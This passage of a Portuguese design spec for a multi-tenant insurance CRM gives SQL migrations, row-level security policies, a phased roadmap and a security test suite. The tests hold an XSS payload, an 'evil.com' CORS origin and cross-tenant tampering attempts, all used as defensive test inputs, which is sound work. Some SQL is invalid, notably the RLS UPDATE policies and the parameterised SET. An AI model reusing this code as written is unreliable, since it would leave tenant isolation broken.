  policy_id UUID NOT NULL REFERENCES policies(id) ON DELETE CASCADE,
  client_id UUID NOT NULL REFERENCES clients(id) ON DELETE CASCADE,
  
  tipo_movimentacao VARCHAR(50) NOT NULL, -- 'inclusao', 'exclusao', 'troca_plano', 'troca_categoria'
  
  beneficiario_nome VARCHAR(255),
  cpf VARCHAR(11),
  data_nascimento DATE,
  vínculo VARCHAR(50), -- 'titular', 'dependente'
  
  plano_atual VARCHAR(100),
  plano_novo VARCHAR(100),
  categoria_atual VARCHAR(100),
  categoria_nova VARCHAR(100),
  
  status VARCHAR(50) NOT NULL DEFAULT 'recebida', -- Fluxo de status definido em 4.1
  
  responsavel_id UUID REFERENCES users(id) ON DELETE SET NULL,
  
  prioridade VARCHAR(50) DEFAULT 'normal',
  
  deleted_at TIMESTAMP,
  deleted_by UUID REFERENCES users(id) ON DELETE SET NULL,
  
  criado_em TIMESTAMP NOT NULL DEFAULT NOW(),
  atualizado_em TIMESTAMP NOT NULL DEFAULT NOW(),
  
  UNIQUE(company_id, numero_protocolo)
);

CREATE INDEX health_requests_policy ON health_requests(policy_id) WHERE deleted_at IS NULL;
CREATE INDEX health_requests_status ON health_requests(company_id, status) WHERE deleted_at IS NULL;

-- Sinistros
CREATE TABLE claims (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  company_id UUID NOT NULL REFERENCES companies(id) ON DELETE CASCADE,
  
  numero_sinistro VARCHAR(50) UNIQUE,
  policy_id UUID NOT NULL REFERENCES policies(id) ON DELETE CASCADE,
  client_id UUID NOT NULL REFERENCES clients(id) ON DELETE CASCADE,
  
  ramo VARCHAR(100),
  tipo_ocorrencia VARCHAR(100),
  
  data_ocorrencia DATE NOT NULL,
  hora_ocorrencia TIME,
  
  localizacao TEXT,
  descricao TEXT,
  
  responsavel_id UUID REFERENCES users(id) ON DELETE SET NULL,
  
  status VARCHAR(50) NOT NULL DEFAULT 'aberto', -- Fluxo definido em seção 14
  prioridade VARCHAR(50) DEFAULT 'normal',
  
  protocolo_seguradora VARCHAR(100),
  
  valor_estimado DECIMAL(15, 2),
  valor_aprovado DECIMAL(15, 2),
  
  deleted_at TIMESTAMP,
  deleted_by UUID REFERENCES users(id) ON DELETE SET NULL,
  
  criado_em TIMESTAMP NOT NULL DEFAULT NOW(),
  atualizado_em TIMESTAMP NOT NULL DEFAULT NOW(),
  
  UNIQUE(company_id, numero_sinistro)
);

CREATE INDEX claims_policy ON claims(policy_id) WHERE deleted_at IS NULL;
CREATE INDEX claims_status ON claims(company_id, status) WHERE deleted_at IS NULL;

-- Renovações
CREATE TABLE renewals (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  company_id UUID NOT NULL REFERENCES companies(id) ON DELETE CASCADE,
  
  policy_id UUID NOT NULL REFERENCES policies(id) ON DELETE CASCADE,
  client_id UUID NOT NULL REFERENCES clients(id) ON DELETE CASCADE,
  
  data_vencimento DATE NOT NULL,
  dias_restantes INT, -- Calculado, não armazenado
  
  status VARCHAR(50) NOT NULL DEFAULT 'pendente', -- 'pendente', 'cotacao_enviada', 'renovada', 'cancelada'
  
  responsavel_id UUID REFERENCES users(id) ON DELETE SET NULL,
  
  deal_renovacao_id UUID REFERENCES deals(id) ON DELETE SET NULL,
  
  deleted_at TIMESTAMP,
  deleted_by UUID REFERENCES users(id) ON DELETE SET NULL,
  
  criado_em TIMESTAMP NOT NULL DEFAULT NOW(),
  atualizado_em TIMESTAMP NOT NULL DEFAULT NOW()
);

CREATE INDEX renewals_vencimento ON renewals(company_id, data_vencimento) WHERE deleted_at IS NULL AND status = 'pendente';
CREATE INDEX renewals_status ON renewals(company_id, status) WHERE deleted_at IS NULL;
```

**Migration 007: Ações em Massa, Configurações, Preferências**
```sql
-- Ações em Massa
CREATE TABLE bulk_actions (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  company_id UUID NOT NULL REFERENCES companies(id) ON DELETE CASCADE,
  
  usuario_id UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
  
  acao VARCHAR(50) NOT NULL, -- 'mover_etapa', 'marcar_ganho', 'trocar_responsavel', etc
  
  filtros JSONB NOT NULL, -- Filtros aplicados
  
  status VARCHAR(50) NOT NULL DEFAULT 'pending', -- 'pending', 'processing', 'completed', 'failed'
  
  total_selecionado INT,
  total_processado INT DEFAULT 0,
  total_falha INT DEFAULT 0,
  
  erros TEXT[],
  
  pode_desfazer BOOLEAN DEFAULT FALSE,
  desfeita_em TIMESTAMP,
  desfeita_por UUID REFERENCES users(id) ON DELETE SET NULL,
  
  criado_em TIMESTAMP NOT NULL DEFAULT NOW(),
  concluido_em TIMESTAMP
);

CREATE INDEX bulk_actions_usuario ON bulk_actions(company_id, usuario_id, criado_em DESC);

-- Dashboard Configurations
CREATE TABLE dashboard_configs (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  company_id UUID NOT NULL REFERENCES companies(id) ON DELETE CASCADE,
  
  cargo VARCHAR(50) NOT NULL, -- 'admin', 'manager', 'user', etc
  
  componentes_ordem TEXT[] NOT NULL, -- Ordem dos componentes
  componentes_visavel JSONB, -- Quais componentes são visíveis
  
  criado_em TIMESTAMP NOT NULL DEFAULT NOW(),
  atualizado_em TIMESTAMP NOT NULL DEFAULT NOW(),
  
  UNIQUE(company_id, cargo)
);

-- Preferências de Usuário
CREATE TABLE user_preferences (
  user_id UUID PRIMARY KEY REFERENCES users(id) ON DELETE CASCADE,
  
  menu_tipo VARCHAR(20) DEFAULT 'vertical', -- 'vertical', 'horizontal'
  tema VARCHAR(20) DEFAULT 'light', -- 'light', 'dark', 'auto'
  
  notificacoes_email BOOLEAN DEFAULT TRUE,
  notificacoes_push BOOLEAN DEFAULT TRUE,
  
  idioma VARCHAR(10) DEFAULT 'pt-BR',
  
  criado_em TIMESTAMP NOT NULL DEFAULT NOW(),
  atualizado_em TIMESTAMP NOT NULL DEFAULT NOW()
);

-- Metas
CREATE TABLE metas (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  company_id UUID NOT NULL REFERENCES companies(id) ON DELETE CASCADE,
  
  usuario_id UUID REFERENCES users(id) ON DELETE CASCADE, -- NULL = meta da empresa
  team_id UUID REFERENCES teams(id) ON DELETE CASCADE, -- NULL = individual
  
  tipo_meta VARCHAR(50) NOT NULL, -- 'valor_vendas', 'quantidade_apólices', 'quantidade_novos_clientes'
  
  valor_target DECIMAL(15, 2) NOT NULL,
  moeda VARCHAR(3) DEFAULT 'BRL',
  
  periodo_inicio DATE NOT NULL,
  periodo_fim DATE NOT NULL,
  
  criado_em TIMESTAMP NOT NULL DEFAULT NOW()
);

CREATE INDEX metas_periodo ON metas(company_id, periodo_inicio, periodo_fim);
```

**Migration 008: Soft Delete e Triggers**
```sql
-- Trigger para atualizar atualizado_em
CREATE OR REPLACE FUNCTION update_atualizado_em()
RETURNS TRIGGER AS $$
BEGIN
  NEW.atualizado_em = NOW();
  RETURN NEW;
END;
$$ LANGUAGE plpgsql;

-- Aplicar para tabelas operacionais
CREATE TRIGGER clients_update_timestamp
  BEFORE UPDATE ON clients
  FOR EACH ROW
  EXECUTE FUNCTION update_atualizado_em();

CREATE TRIGGER deals_update_timestamp
  BEFORE UPDATE ON deals
  FOR EACH ROW
  EXECUTE FUNCTION update_atualizado_em();

CREATE TRIGGER policies_update_timestamp
  BEFORE UPDATE ON policies
  FOR EACH ROW
  EXECUTE FUNCTION update_atualizado_em();

CREATE TRIGGER tasks_update_timestamp
  BEFORE UPDATE ON tasks
  FOR EACH ROW
  EXECUTE FUNCTION update_atualizado_em();

-- Função para validar company_id ao inserir (defesa em profundidade)
CREATE OR REPLACE FUNCTION validate_company_id()
RETURNS TRIGGER AS $$
BEGIN
  IF NEW.company_id IS NULL THEN
    RAISE EXCEPTION 'company_id cannot be null';
  END IF;
  RETURN NEW;
END;
$$ LANGUAGE plpgsql;

CREATE TRIGGER clients_company_id_check
  BEFORE INSERT ON clients
  FOR EACH ROW
  EXECUTE FUNCTION validate_company_id();

-- (Repetir para todas as tabelas com company_id)
```

---

## 12. ROW-LEVEL SECURITY (RLS) — DETALHADO

### 12.1 Problema de Connection Pooling

Com `set app.company_id` na conexão, **em pooling**, a variável permanece se a conexão for reutilizada:

```
Connection Pool:
┌─ Conexão #1
│  ├─ Request A (User da Empresa X) → SET app.company_id = X
│  └─ Request B (User da Empresa Y) → REUTILIZA conexão #1 → app.company_id AINDA É X ❌
│
└─ Conexão #2
```

**Solução**: Usar transações curtas com session reset explícito:

```javascript
async function executeQuery(companyId, query, params) {
  const client = await pool.connect(); // Pega conexão do pool
  
  try {
    await client.query('BEGIN TRANSACTION');
    
    // 1. SET app.company_id (SEMPRE, mesmo se já setado)
    await client.query("SET app.company_id = $1", [companyId]);
    
    // 2. Executar query
    const result = await client.query(query, params);
    
    await client.query('COMMIT');
    
    return result;
  } catch (err) {
    await client.query('ROLLBACK');
    throw err;
  } finally {
    // 3. RESET ao devolver conexão para pool
    await client.query("RESET app.company_id"); // CRITICAL
    client.release();
  }
}
```

### 12.2 RLS Policies (Exemplo: Tabela Clients)

```sql
-- ROLE de aplicação (criada uma vez)
CREATE ROLE app_user LOGIN;
GRANT CONNECT ON DATABASE pipenexo_db TO app_user;

-- Negar BYPASSRLS (máxima importância)
ALTER ROLE app_user NOINHERIT;
ALTER ROLE app_user NOBYPASSRLS; -- Explícito

-- Habilitar RLS
ALTER TABLE clients ENABLE ROW LEVEL SECURITY;

-- Policy SELECT
CREATE POLICY clients_select_policy ON clients
  FOR SELECT
  USING (
    company_id = current_setting('app.company_id')::uuid
  );

-- Policy INSERT
CREATE POLICY clients_insert_policy ON clients
  FOR INSERT
  WITH CHECK (
    company_id = current_setting('app.company_id')::uuid
  );

-- Policy UPDATE
CREATE POLICY clients_update_policy ON clients
  FOR UPDATE
  USING (company_id = current_setting('app.company_id')::uuid)
  AND (NEW.company_id = current_setting('app.company_id')::uuid); -- Não permite mudar company_id

-- Policy DELETE (soft delete apenas)
CREATE POLICY clients_delete_policy ON clients
  FOR DELETE
  USING (company_id = current_setting('app.company_id')::uuid);

-- Conceder permissões mínimas
GRANT SELECT, INSERT, UPDATE, DELETE ON clients TO app_user;
```

### 12.3 Teste de RLS

```sql
-- Simulação: definir company_id de Enterprise A
SET app.company_id = 'aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa';

-- Inserir cliente
INSERT INTO clients (id, company_id, nome, ...) 
VALUES ('client-1', 'aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa', 'Cliente A', ...);

-- Trocar para Enterprise B (simular outra requisição)
SET app.company_id = 'bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb';

-- Tentar selecionar cliente de A
SELECT * FROM clients WHERE id = 'client-1';
-- Resultado: 0 linhas (RLS bloqueou) ✅

-- Tentar atualizar cliente de A
UPDATE clients SET nome = 'Hacked' WHERE id = 'client-1';
-- Resultado: 0 rows affected (RLS bloqueou) ✅

-- Tentar via query sem filtro
SELECT * FROM clients;
-- Resultado: Clientes apenas de B ✅
```

### 12.4 Aplicar RLS a Todas as Tabelas

Para CADA tabela operacional, executar:

```sql
ALTER TABLE {tabela} ENABLE ROW LEVEL SECURITY;

CREATE POLICY {tabela}_select_policy ON {tabela}
  FOR SELECT
  USING (company_id = current_setting('app.company_id')::uuid);

CREATE POLICY {tabela}_insert_policy ON {tabela}
  FOR INSERT
  WITH CHECK (company_id = current_setting('app.company_id')::uuid);

CREATE POLICY {tabela}_update_policy ON {tabela}
  FOR UPDATE
  USING (company_id = current_setting('app.company_id')::uuid)
  AND (NEW.company_id = current_setting('app.company_id')::uuid);

CREATE POLICY {tabela}_delete_policy ON {tabela}
  FOR DELETE
  USING (company_id = current_setting('app.company_id')::uuid);

GRANT SELECT, INSERT, UPDATE, DELETE ON {tabela} TO app_user;
```

---

## 13. PLANOS DE IMPLEMENTAÇÃO (FASE 0 a FASE 5)

### 13.1 FASE 0: Fundação de Segurança (Pré-requisito Obrigatório — 5-7 dias)

**Objetivo**: Transformar de "prototipo com localStorage" para "SaaS seguro com autenticação e isolamento real".

**Bloqueador**: Nada da FASE 1-5 começa enquanto FASE 0 não está 100% completa e testada.

**Escopo**:
1. **Backend**: Node.js/Express com todas as 8 migrations SQL aplicadas
2. **Autenticação**: JWT + bcrypt + refresh token rotation
3. **RLS**: Habilitado em todas as tabelas operacionais
4. **Web Security**: Headers, CSRF, CORS, input validation
5. **Isolamento Tenant**: middleware injeta company_id em todo request
6. **Frontend seguro**: Login obrigatório, sem dados antes de auth, httpOnly cookies

**Entregas FASE 0**:
- [ ] PostgreSQL com todas 8 migrations aplicadas
- [ ] Backend Express com rotas /auth (login, refresh, logout, password-reset)
- [ ] Autenticação funcional (não fake): email + bcrypt hash
- [ ] 3 frontends separados: /public, /app, /admin (apenas /app por enquanto)
- [ ] Middleware de auth injeta context em req
- [ ] RLS habilitado e testado em todas tabelas
- [ ] CSRF, CORS, CSP, Helmet configurados
- [ ] Tokens em httpOnly cookies (nunca localStorage)
- [ ] Audit logs registrando login/logout/failed auth
- [ ] Test suite FASE 0 passando 100%

**Dependências**:
- Nenhuma (FASE 0 é independente)

**Roadmap**:
| Dia | Task |
|-----|------|
| 1-2 | Setup backend (migrations, models, roles) |
| 3-4 | Autenticação (login, hash, JWT, refresh token) |
| 5 | RLS + policies + connection pooling |
| 6 | Web security (CORS, CSRF, CSP, validation) |
| 7 | Frontend seguro + teste integrado |

---

### 13.2 FASE 1: Core CRM (Semanas 2-3, após FASE 0)

**Objetivo**: CRM funcional com clientes, pipelines, negócios, apólices.

**Pré-requisito**: FASE 0 100% completa

**Escopo**:
- Rotas CRUD para: /api/clients, /api/deals, /api/policies, /api/pipelines
- Permissões granulares (quem pode criar/editar/deletar cada entidade)
- Timeline de mudanças (timeline_events para cada cliente/negócio)
- Dashboard básico (totalizadores por pipeline)
- Frontend: telas de clientes, negócios, apólices com CRUD

**Entregas**:
- [ ] GET/POST /api/clients (listar, criar, editar, deletar)
- [ ] GET/POST /api/deals (negócios com filtro por stage)
- [ ] GET/POST /api/policies (apólices com filtro por vigência)
- [ ] GET/POST /api/pipelines (criar pipelines customizados)
- [ ] Middleware de permissões: can_create_clients, can_edit_deals, etc
- [ ] Timeline automática para cada ação
- [ ] Dashboard JSON (GET /api/dashboard)
- [ ] Frontend Clientes, Negócios, Apólices com busca/filtro
- [ ] Testes FASE 1 passando 100%

**Dependências**: FASE 0

---

### 13.3 FASE 2: Automatização e Protocolos (Semanas 4-5)

**Objetivo**: Sinistros, requisições de saúde, protocolos sequenciais, renovações automáticas.

**Pré-requisito**: FASE 1 completa

**Escopo**:
- Gerador de protocolo (NEXO-SINI-000001, etc)
- Sinistros com rastreamento de status
- Requisições de saúde com workflow
- Renovações automáticas (cron job a cada 6h)
- Notificações por tarefa
- Bulk actions (registrar múltiplos sinistros)

**Entregas**:
- [ ] POST /api/protocols/next?type=SINISTRO (gerador sequencial)
- [ ] POST /api/claims (criar sinistro com protocol auto)
- [ ] POST /api/health-requests (requisição saúde)
- [ ] GET/POST /api/renewals (renovações)
- [ ] Cron job: varrer apólices vencendo em 60d, criar renovações
- [ ] Notificações via task + email
- [ ] Bulk actions: importar 100 sinistros + idempotency key
- [ ] Testes FASE 2 passando 100%

**Dependências**: FASE 1

---

### 13.4 FASE 3: Billing e Planos (Semanas 6-7)

**Objetivo**: SaaS multi-tenant com cobrança por empresa.

**Pré-requisito**: FASE 2 completa

**Escopo**:
- Planos: Básico ($49), Pro ($149), Enterprise (custom)
- Subscriptions com webhooks (Stripe, PagSeguro, etc)
- Invoices automáticas a cada ciclo
- Gating de features por plano (módulos desabilitados se não pago)
- Histórico de pagamentos
- Upgrade/downgrade de plano

**Entregas**:
- [ ] Plans definidos (Básico, Pro, Enterprise)
- [ ] GET /api/plans (listar)
- [ ] POST /api/subscriptions (criar assinatura)
- [ ] Webhook handler (pagamento confirmado → ativar plano)
- [ ] Webhook handler (pagamento falhou → desativar features)
- [ ] Feature gating: módulos bloqueados se plano insuficiente
- [ ] GET /api/invoices (histórico de faturas)
- [ ] Admin: upgrade/downgrade interface
- [ ] Testes FASE 3 passando 100%

**Dependências**: FASE 2

---

### 13.5 FASE 4: Integrações de Seguradoras (Semanas 8-10)

**Objetivo**: Pull de dados reais de seguradoras (cotações, apólices).

**Pré-requisito**: FASE 3 completa

**Escopo**:
- Adaptadores para 3+ seguradoras (SulAmérica, Bradesco, Porto, etc)
- Login + busca de cotações
- Sincronização de apólices e vigências
- Histórico de cotações
- Comparação lado a lado

**Entregas**:
- [ ] POST /api/insurers/authenticate (login em seguradora)
- [ ] GET /api/insurers/quotes?client_id=X (buscar cotações)
- [ ] Adaptador SulAmérica (login + scraping/API)
- [ ] Adaptador Bradesco
- [ ] Adaptador Porto
- [ ] Sync job (diário): buscar apólices vigentes
- [ ] UI: comparador de cotações
- [ ] Testes FASE 4 passando 100%

**Dependências**: FASE 3

---

### 13.6 FASE 5: Analytics e Avançado (Semanas 11-12)

**Objetivo**: Relatórios, analytics, IA deepdive, mobilidade.

**Pré-requisito**: FASE 4 completa

**Escopo**:
- Dashboards por métrica (receita, comissões, sinistralidade)
- Relatórios customizados
- Integração profunda com NEXO IA (análise de risco, recomendações)
- App mobile (React Native)
- CRM avançado (scoring, automações custom)

**Entregas**:
- [ ] GET /api/analytics?period=month (receita, comissões, etc)
- [ ] POST /api/reports/custom (criar relatório customizado)
- [ ] GET /api/reports (listar, exportar PDF/Excel)
- [ ] Integração NEXO: análise de risco automática
- [ ] Recomendações IA (próximas ações, produtos sugeridos)
- [ ] Mobile app: visualização de pipeline, notificações push
- [ ] Automações custom: disparar ação quando regra é atingida
- [ ] Testes FASE 5 passando 100%

**Dependências**: FASE 4

---

## 14. SECURITY TEST SUITE (FASE 0)

**Objetivo**: Garantir que todas as camadas de segurança funcionam (app + database + network).

**Execução**: Toda alteração de código deve passar nestes testes antes de merge.

### 14.1 Testes de Autenticação (5 testes)

```javascript
describe('Authentication', () => {
  test('❌ Login sem password falha', async () => {
    const res = await request(app).post('/api/auth/login')
      .send({ email: 'user@company.com' });
    expect(res.status).toBe(400);
  });

  test('❌ Login com password errada falha', async () => {
    // Criar user com password "correct"
    await createUser({ email: 'user@company.com', password: 'correct' });
    
    const res = await request(app).post('/api/auth/login')
      .send({ email: 'user@company.com', password: 'wrong' });
    expect(res.status).toBe(401);
  });

  test('✅ Login com password correta retorna JWT', async () => {
    await createUser({ email: 'user@company.com', password: 'correct' });
    
    const res = await request(app).post('/api/auth/login')
      .send({ email: 'user@company.com', password: 'correct' });
    expect(res.status).toBe(200);
    expect(res.body.accessToken).toBeDefined();
    expect(res.body.refreshToken).toBeDefined();
  });

  test('❌ JWT expirado retorna 401', async () => {
    const expiredToken = jwt.sign({ userId: 'u1', companyId: 'c1' }, 
      secret, { expiresIn: '-1h' });
    
    const res = await request(app).get('/api/clients')
      .set('Authorization', `Bearer ${expiredToken}`);
    expect(res.status).toBe(401);
  });

  test('✅ Refresh token gera novo accessToken', async () => {
    const { refreshToken } = await loginUser();
    
    const res = await request(app).post('/api/auth/refresh')
      .send({ refreshToken });
    expect(res.status).toBe(200);
    expect(res.body.accessToken).toBeDefined();
  });
});
```

### 14.2 Testes de Isolamento Tenant (5 testes)

```javascript
describe('Tenant Isolation', () => {
  let tokenA, tokenB, clientIdA, clientIdB;

  beforeAll(async () => {
    // Company A: criar usuario, criar cliente
    const userA = await createUser({ company_id: 'companyA', email: 'a@a.com' });
    tokenA = await loginUser('a@a.com', 'password');
    clientIdA = await createClient(tokenA, { nome: 'Client A' });
    
    // Company B: criar usuario, crear cliente
    const userB = await createUser({ company_id: 'companyB', email: 'b@b.com' });
    tokenB = await loginUser('b@b.com', 'password');
    clientIdB = await createClient(tokenB, { nome: 'Client B' });
  });

  test('❌ User A não vê clientes de User B', async () => {
    const res = await request(app).get(`/api/clients/${clientIdB}`)
      .set('Authorization', `Bearer ${tokenA}`);
    expect(res.status).toBe(404); // Não 403, para ocultar existência
  });

  test('❌ User A não pode deletar cliente de User B', async () => {
    const res = await request(app).delete(`/api/clients/${clientIdB}`)
      .set('Authorization', `Bearer ${tokenA}`);
    expect(res.status).toBe(404);
  });

  test('❌ User A não pode ver lista de clientes de User B', async () => {
    const resA = await request(app).get('/api/clients')
      .set('Authorization', `Bearer ${tokenA}`);
    expect(resA.body).toHaveLength(1); // Apenas Client A
    expect(resA.body[0].id).toBe(clientIdA);
  });

  test('❌ Tentar injetar company_id no body é ignorado', async () => {
    const res = await request(app).post('/api/clients')
      .set('Authorization', `Bearer ${tokenA}`)
      .send({ nome: 'Fake', company_id: 'companyB' });
    
    // Client é criado com companyA (do token), não companyB
    expect(res.status).toBe(201);
    const created = await getClient(res.body.id);
    expect(created.company_id).toBe('companyA');
  });

  test('❌ RLS no database rejeita leitura cruzada', async () => {
    // Query direto no DB como appuser (simular bypass de validação app)
    const rows = await db.query(
      "SELECT * FROM clients WHERE company_id = 'companyB'"
    );
    // RLS retorna 0 linhas (SET app.company_id foi 'companyA')
    expect(rows).toHaveLength(0);
  });
});
```

### 14.3 Testes de Permissões (4 testes)

```javascript
describe('Permissions', () => {
  test('❌ User sem role "can_create_clients" não consegue criar', async () => {
    const userToken = await loginUser('limited@company.com'); // role sem permissão
    
    const res = await request(app).post('/api/clients')
      .set('Authorization', `Bearer ${userToken}`)
      .send({ nome: 'Test' });
    expect(res.status).toBe(403);
  });

  test('✅ Admin consegue criar clientes', async () => {
    const adminToken = await loginUser('admin@company.com'); // role=admin
    
    const res = await request(app).post('/api/clients')
      .set('Authorization', `Bearer ${adminToken}`)
      .send({ nome: 'Test' });
    expect(res.status).toBe(201);
  });

  test('❌ Soft-deleted client não aparece em listagem', async () => {
    const token = await getAdminToken();
    const client = await createClient(token, { nome: 'ToDelete' });
    
    // Soft delete
    await request(app).delete(`/api/clients/${client.id}`)
      .set('Authorization', `Bearer ${token}`);
    
    const res = await request(app).get('/api/clients')
      .set('Authorization', `Bearer ${token}`);
    const found = res.body.find(c => c.id === client.id);
    expect(found).toBeUndefined();
  });

  test('✅ Admin pode restaurar soft-deleted', async () => {
    const token = await getAdminToken();
    const client = await createClient(token, { nome: 'ToRestore' });
    await softDeleteClient(token, client.id);
    
    const res = await request(app).post(`/api/clients/${client.id}/restore`)
      .set('Authorization', `Bearer ${token}`);
    expect(res.status).toBe(200);
  });
});
```

### 14.4 Testes de Web Security (5 testes)

```javascript
describe('Web Security', () => {
  test('❌ XSS: <script> tag em nome de cliente é escapado', async () => {
    const token = await getAdminToken();
    
    const res = await request(app).post('/api/clients')
      .set('Authorization', `Bearer ${token}`)
      .send({ nome: '<script>alert(1)</script>' });
    
    expect(res.status).toBe(201);
    const client = await getClient(res.body.id);
    expect(client.nome).toBe('&lt;script&gt;alert(1)&lt;/script&gt;'); // Escapado
  });

  test('❌ CSRF: POST sem CSRF token retorna 403', async () => {
    const token = await getAdminToken();
    
    const res = await request(app).post('/api/clients')
      .set('Authorization', `Bearer ${token}`)
      // Sem X-CSRF-Token header
      .send({ nome: 'Test' });
    expect(res.status).toBe(403);
  });

  test('✅ CORS: Same-origin request permitido', async () => {
    const res = await request(app).get('/api/clients')
      .set('Authorization', `Bearer ${await getAdminToken()}`)
      .set('Origin', 'https://pipenexo.com.br');
    expect(res.status).toBe(200);
  });

  test('❌ CORS: Diferente origem é bloqueada', async () => {
    const res = await request(app).get('/api/clients')
      .set('Authorization', `Bearer ${await getAdminToken()}`)
      .set('Origin', 'https://evil.com');
    expect(res.status).toBe(403);
  });

  test('✅ Security headers presentes', async () => {
    const res = await request(app).get('/api/clients')
      .set('Authorization', `Bearer ${await getAdminToken()}`);
    
    expect(res.headers['x-frame-options']).toBe('DENY');
    expect(res.headers['x-content-type-options']).toBe('nosniff');
    expect(res.headers['strict-transport-security']).toBeDefined();
  });
});
```

### 14.5 Testes de Rate Limiting (3 testes)

```javascript
describe('Rate Limiting', () => {
  test('❌ 5 falhas de login consecutivas dispara bloqueio', async () => {
    for (let i = 0; i < 5; i++) {
      await request(app).post('/api/auth/login')
        .send({ email: 'user@company.com', password: 'wrong' });
    }
    
    // 6ª tentativa
    const res = await request(app).post('/api/auth/login')
      .send({ email: 'user@company.com', password: 'correct' });
    expect(res.status).toBe(429); // Too Many Requests
  });

  test('✅ Após 15 minutos, bloqueio é levantado', async () => {
    // Setup: fazer 5 falhas
    for (let i = 0; i < 5; i++) {
      await request(app).post('/api/auth/login')
        .send({ email: 'user@company.com', password: 'wrong' });
    }
    
    // Avançar relógio 15 minutos
    jest.useFakeTimers();
    jest.advanceTimersByTime(15 * 60 * 1000);
    
    // Tentar login novamente
    const res = await request(app).post('/api/auth/login')
      .send({ email: 'user@company.com', password: 'correct' });
    expect(res.status).toBe(200); // Desbloqueado
  });

  test('❌ Limite de requisições global (100/15min) funciona', async () => {
    const token = await getAdminToken();
    
    // Fazer 100 requisições rapidamente
    const promises = [];
    for (let i = 0; i < 100; i++) {
      promises.push(
        request(app).get('/api/clients')
          .set('Authorization', `Bearer ${token}`)
      );
    }
    await Promise.all(promises);
    
    // 101ª é rejeitada
    const res = await request(app).get('/api/clients')
      .set('Authorization', `Bearer ${token}`);
    expect(res.status).toBe(429);
  });
});
```

### 14.6 Testes de Auditoria (2 testes)

```javascript
describe('Audit Logging', () => {
  test('✅ Cada ação CREATE é registrada em audit_logs', async () => {
    const token = await getAdminToken();
    const userId = await getUserId(token);
    
    const res = await request(app).post('/api/clients')
      .set('Authorization', `Bearer ${token}`)
      .send({ nome: 'AuditTest' });
    
    const clientId = res.body.id;
    
    // Verificar audit_logs
    const logs = await db.query(
      "SELECT * FROM audit_logs WHERE recurso_id = $1",
      [clientId]
    );
    
    expect(logs).toHaveLength(1);
    expect(logs[0].acao).toBe('CREATE');
    expect(logs[0].user_id).toBe(userId);
    expect(logs[0].valor_depois).toHaveProperty('nome', 'AuditTest');
  });

  test('✅ UPDATE registra valor_antes e valor_depois', async () => {
    const token = await getAdminToken();
    const client = await createClient(token, { nome: 'Original' });
    
    await request(app).put(`/api/clients/${client.id}`)
      .set('Authorization', `Bearer ${token}`)
      .send({ nome: 'Updated' });
    
    const logs = await db.query(
      "SELECT * FROM audit_logs WHERE recurso_id = $1 AND acao = 'UPDATE'",
      [client.id]
    );
    
    expect(logs).toHaveLength(1);
    expect(logs[0].valor_antes).toHaveProperty('nome', 'Original');
    expect(logs[0].valor_depois).toHaveProperty('nome', 'Updated');
  });
});
```

---

## 15. CRITÉRIOS DE CONCLUSÃO (Por Fase)

### FASE 0: Segurança ✅ (Pré-requisito para tudo)

| Critério | Teste | Status |
|----------|-------|--------|
| ✅ Autenticação JWT funcional | 14.1 (5 testes) | DEVE PASSAR 100% |
| ✅ Isolamento tenant impossível burlar | 14.2 (5 testes) | DEVE PASSAR 100% |
| ✅ Permissões enforced no backend | 14.3 (4 testes) | DEVE PASSAR 100% |
| ✅ Web security (XSS, CSRF, CORS) | 14.4 (5 testes) | DEVE PASSAR 100% |
| ✅ Rate limiting funcional | 14.5 (3 testes) | DEVE PASSAR 100% |
| ✅ Auditoria completa | 14.6 (2 testes) | DEVE PASSAR 100% |
| ✅ RLS testado no Postgres | 14.2 (test 5) | DEVE PASSAR 100% |
| ✅ Frontend com login obrigatório | Manual | SEM DADOS ANTES AUTH |
| ✅ Tokens em httpOnly cookies | Manual | NUNCA LOCALHOST |
| ✅ Sem dados de exemplo no dom | Manual | LOGIN PRIMEIRO |

**Bloqueador de Deploy**: Se qualquer teste falha, não avança para FASE 1.

---

### FASE 1: Core CRM ✅

| Critério | Teste |
|----------|-------|
| ✅ CRUD de clientes funcional | GET/POST/PUT/DELETE /api/clients |
| ✅ CRUD de negócios com filtro de stage | GET/POST /api/deals?stage=X |
| ✅ CRUD de apólices com filtro de vigência | GET /api/policies?status=ativo |
| ✅ Timeline automática | POST cliente → timeline_event criado |
| ✅ Dashboard JSON retorna números corretos | GET /api/dashboard valida totalizadores |
| ✅ Filtro/busca performático (<500ms) | Teste de carga com 10k registros |
| ✅ Frontend com todas 3 telas (clientes, negócios, apólices) | Visual check |
| ✅ Testes FASE 1 passando 100% | Suite completa |

---

### FASE 2: Automatização ✅

| Critério | Teste |
|----------|-------|
| ✅ Gerador de protocolo sequencial | POST /api/protocols/next retorna NEXO-SINI-000001 |
| ✅ Sinistros com status workflow | GET /api/claims/:id mostra stages corretos |
| ✅ Renovações automáticas | Cron roda 2x/dia, cria renovações 60d antes vencimento |
| ✅ Bulk import com idempotency key | POST 100 claims com mesmo key = 1 import |
| ✅ Notificações por task | Nova renovação → task criada para corretor |
| ✅ Testes FASE 2 passando 100% | Suite completa |

---

### FASE 3: Billing ✅

| Critério | Teste |
|----------|-------|
| ✅ Planos definidos (Básico/Pro/Enterprise) | GET /api/plans retorna 3 |
| ✅ Webhook de pagamento funcional | Pagamento → subscription ativo |
| ✅ Feature gating por plano | Plano Básico não vê "Relatórios" |
| ✅ Testes FASE 3 passando 100% | Suite completa |

---

### FASE 4: Integrações ✅

| Critério | Teste |
|----------|lanteste |
| ✅ 3+ adaptadores de seguradoras | SulAmérica, Bradesco, Porto |
| ✅ Cotações integradas | GET /api/insurers/quotes retorna dados reais |
| ✅ Sync diário de apólices | Job roda, atualiza vigências |
| ✅ Testes FASE 4 passando 100% | Suite completa |

---

### FASE 5: Advanced ✅

| Critério | Teste |
|----------|-------|
| ✅ Dashboards por métrica | GET /api/analytics retorna receita, comissões |
| ✅ Relatórios customizados | POST /api/reports, exporta PDF |
| ✅ Integração NEXO IA | Análise de risco automática |
| ✅ Mobile app funcional | iOS/Android com login, visualiza pipeline |
| ✅ Testes FASE 5 passando 100% | Suite completa |

---

